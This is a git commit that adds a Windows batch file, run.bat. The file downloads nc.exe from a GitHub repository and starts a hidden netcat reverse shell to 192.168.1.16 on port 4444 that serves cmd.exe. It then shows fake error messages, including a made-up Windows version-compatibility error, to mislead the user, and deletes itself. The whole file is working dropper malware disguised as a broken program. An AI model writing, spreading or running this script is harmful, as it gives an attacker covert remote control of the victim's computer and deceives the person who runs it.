eed77e8fb095716a6d43ae148d054c1da31600ac
Omar Samy <osamy7592@gmail.com>
2024-06-02 13:59:57 +0300

    Create run.bat

---
+++ run.bat
@@ -0,0 +1,11 @@
+curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe
+powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"
+@echo off
+for /L %%i in (1,1,40) do (
+    echo Error occurred
+    ping -n 1 -w 750 127.0.0.1 >nul
+)
+echo.
+echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
+timeout /t 3 >nul
+del "%~f0"
